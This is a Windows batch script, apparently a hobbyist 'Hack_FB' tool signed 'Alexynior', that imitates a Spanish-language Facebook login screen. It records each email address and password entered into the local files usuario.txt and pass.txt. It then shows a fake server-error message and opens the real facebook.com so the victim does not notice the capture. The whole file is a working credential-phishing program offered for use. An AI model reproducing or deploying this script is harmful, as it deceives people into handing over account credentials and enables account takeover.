@echo off
chcp 1252
pushd "C:\Users\Alexynior\Documents\Hack_FB"
title INICIAR SESIÓN
chcp 1252
color 1f
:menu
cls
figletcmd F a c e b o o k . c o m -f Slant -w 200 & 
echo                                             by Alexynior
echo.
echo.
echo.
echo 1. Iniciar Sesión
echo 2. Registrarse
echo 3. Salir
echo.
set /p input=¿Qué opción deseas utilizar?: 
<nul set /p "=> "
echo %Input%|findstr /i "[12]">nul && goto reg || goto exit
:reg
cls
color 1f
figletcmd F a c e b o o k . com -f Slant -w 100 & 
set /p usuario=Ingresa tu correo electrónico:  
set /p pass=Ingresa tu contraseña:  
echo %usuario% >> usuario.txt
echo %pass% >> pass.txt
cls
figletcmd F a c e b o o k . com -f Slant -w 100 & 
echo.
echo.
echo  ¡BIENVENIDO!
echo.
echo.
echo       +-----------------------------+
SET "nick=%usuario%"
:loop1
IF DEFINED nick IF "%nick:~28,1%" neq "" GOTO shownick
SET "nick=%nick% "
IF "%nick:~28,1%" neq "" GOTO shownick
SET "nick= %nick%"
GOTO loop1
:shownick
echo       ^|%nick%^|  
echo       +-----------------------------+
echo.
pause
TIMEOUT /T 3 >NUL
COLOR 1f
echo.
color 4f
powershell write-host -back Red Se produjo un error al conectarse al servidor. Inténtalo de nuevo más tarde
echo.
echo.
start chrome https://www.facebook.com
pause
goto menu
:exit
pause
exit